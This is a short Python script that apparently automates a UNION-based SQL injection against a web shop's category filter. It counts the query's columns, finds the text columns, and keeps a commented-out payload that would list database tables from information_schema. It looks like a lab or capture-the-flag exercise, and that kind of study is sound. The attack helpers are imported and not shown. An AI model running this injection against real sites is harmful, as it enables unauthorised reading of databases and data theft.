import sys
import logging
import urllib3

import requests


import utils
from shop import Shop
log = logging.getLogger(__name__) 
logging.basicConfig(
    stream=sys.stdout, 
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

def main(args):
    shop = Shop(args.url, args.no_proxy)
    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
    if not num_columns:
        log.error("Couldn't determine number of columns. Exiting")
        sys.exit(-1)
    text_columns = utils.determine_text_columns(
        shop.category_url, shop.no_proxy, num_columns
        )
    print(num_columns, text_columns)
    #nulls = ["NULL"] * num_columns
    #nulls[text_columns[0]] = "'a'"
    #nulls = ",".join(nulls)
    #resp = shop.get_category(
    #    f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
    #)
    #print(resp.txt)
        



if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)